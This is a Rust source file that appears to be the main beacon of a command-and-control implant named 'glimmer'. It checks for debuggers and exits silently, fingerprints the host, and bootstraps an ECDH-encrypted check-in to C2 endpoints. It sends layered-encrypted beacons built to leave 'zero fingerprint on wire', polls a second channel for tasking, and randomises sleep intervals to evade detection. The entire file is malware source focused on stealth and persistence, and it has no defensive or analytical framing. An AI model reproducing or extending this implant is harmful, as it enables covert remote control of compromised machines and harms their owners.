use glimmer::antidebug;
use glimmer::c2::http::HTTPChannel;
use glimmer::c2::{Channel, SendContext};
use glimmer::cfg::Config;
use glimmer::crypto::{self, TimeBasedKey};
use glimmer::identity;
use glimmer::proto::{CheckinData, Envelope, MsgType};
use glimmer::sys;

fn main() {

    // Anti-debug checks
    if antidebug::check() {
        // exit silently, sleep forever, or alter behavior, exiting for now.
        std::process::exit(0);
    }

    let config = match Config::load("config.json") {
        Ok(c) => c,
        Err(_e) => {
            glimmer::dbg_log!("[beacon] config: {}", _e);
            std::process::exit(1);
        }
    };

    let host = sys::read_file_string(
        &glimmer::strings::decode_str(glimmer::strings::ETC_HOSTNAME)
    ).unwrap_or_else(|_| "unknown".into());

    let node_id = identity::generate_with_hostname(&host);

    let server_pub = match config.server_public_key_bytes() {
        Ok(k) => k,
        Err(_e) => {
            glimmer::dbg_log!("[beacon] config: invalid server public key: {}", _e);
            std::process::exit(1);
        }
    };

    let channel = match HTTPChannel::new(config.endpoints().to_vec()) {
        Ok(c) => c,
        Err(_e) => {
            glimmer::dbg_log!("[beacon] check-in channel init failed: {}", _e);
            std::process::exit(1);
        }
    };

    glimmer::dbg_log!(
        "[beacon] check-in channel: {} (stealth={}, max={})",
        channel.info().name,
        channel.info().stealth,
        channel.info().max_payload
    );

    // Phase 1: Bootstrap with full ephemeral ECDH
    let checkin = CheckinData {
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        host: host.clone(),
        pid: std::process::id(),
        pub_key: vec![],
    };

    let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
        Ok(tk) => {
            glimmer::dbg_log!("[beacon] bootstrap complete, time-based key established");
            tk
        }
        Err(_e) => {
            glimmer::dbg_log!("[beacon] bootstrap failed: {}", _e);
            std::process::exit(1);
        }
    };

    // DNF beacon channel
    let dnf_channel = glimmer::c2::dnf::DnfChannel::new("127.0.0.1", 8080);

    // Phase 2: Layered encryption - time-based outer, ECIES inner. Sleep before first beacon
    loop {
        sleep_adaptive(config.beacon_interval());

        if antidebug::check() {
            // exit silently, sleep forever, or alter behavior, exiting for now, should probably sleep
            std::process::exit(0);
        }

        match send_layered(
            MsgType::Beacon,
            &node_id,
            None::<&()>,
            &time_key,
            &server_pub,
            &channel,
        ) {
            Ok(_) => { glimmer::dbg_log!("[beacon] http beacon sent [layered]"); },
            Err(_e) => { glimmer::dbg_log!("[beacon] http beacon failed: {}", _e); },
        }

        // Poll DNF channel for tasking
        match dnf_channel.poll(&time_key) {
            Ok(Some(_tasking)) => {
                glimmer::dbg_log!(
                    "[beacon] dnf poll complete. tasking received: code=0x{:02x} args=0x{:03x}",
                    _tasking.task_code, _tasking.args
                );
                // TODO: dispatch tasking
            }
            Ok(None) => {
                glimmer::dbg_log!("[beacon] dnf poll complete. no tasking");
            }
            Err(_e) => {
                glimmer::dbg_log!("[beacon] dnf poll error: {}", _e);
            }
        }

    }
}

/// Phase 1: Bootstrap checkin with full ephemeral ECDH.
/// Establishes the time-based root secret for the outer encryption layer.
fn bootstrap(
    node_id: &str,
    checkin: &CheckinData,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<TimeBasedKey, Box<dyn std::error::Error>> {
    let envelope = Envelope::with_data(MsgType::Checkin, node_id, checkin)?;
    let serialized = envelope.marshal()?;

    let (encrypted, _response_kp, root_secret) =
        crypto::bootstrap_encrypt(&serialized, server_pub)?;

    let ctx = SendContext::new(server_pub, node_id, encrypted);
    let _response = channel.send(&ctx)?;

    // 300 second time buckets
    Ok(TimeBasedKey::new(root_secret, 300))
}

/// Phase 2: Layered encryption.
/// Inner: ECIES with per-message ephemeral key - only server can decrypt.
/// Outer: Time-based key - hides the EC fingerprint on the wire.
fn send_layered<T: serde::Serialize>(
    msg_type: MsgType,
    node_id: &str,
    payload: Option<&T>,
    time_key: &TimeBasedKey,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = match payload {
        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
        None => Envelope::new(msg_type, node_id, None),
    };

    let serialized = envelope.marshal()?;

    // Inner layer: per-message ephemeral ECDH, only server can decrypt
    let inner = crypto::encrypt_for_server(&serialized, server_pub)?;

    // Outer layer: time-based, zero fingerprint on wire
    let outer = time_key.encrypt(&inner)?;

    let ctx = SendContext::new(server_pub, node_id, outer);
    channel.send(&ctx)
}

fn sleep_adaptive(config_interval: std::time::Duration) {
    use std::time::Duration;

    let base_secs = config_interval.as_secs_f64();

    // Generate a sleep time from an exponential distribution
    // rather than uniform. This produces mostly short intervals
    // with occasional very long ones instead of uniform jitter.
    let uniform: f64 = rand::random();

    // Inverse transform sampling for exponential distribution
    // mean = base_secs, but actual intervals range from near-zero
    // to several multiples of base
    let exponential = -base_secs * uniform.ln();

    // Minimum 30% of base with jitter, maximum 10x base
    let min_jitter: f64 = rand::random();
    let min_secs = base_secs * (0.3 + 0.2 * min_jitter);
    let max_secs = base_secs * 10.0;
    let clamped = exponential.max(min_secs).min(max_secs);

    glimmer::dbg_log!("sleep: base={:.1} exp={:.1} min={:.1} clamped={:.1}", 
        base_secs, exponential, min_secs, clamped);

    std::thread::sleep(Duration::from_secs_f64(clamped));
}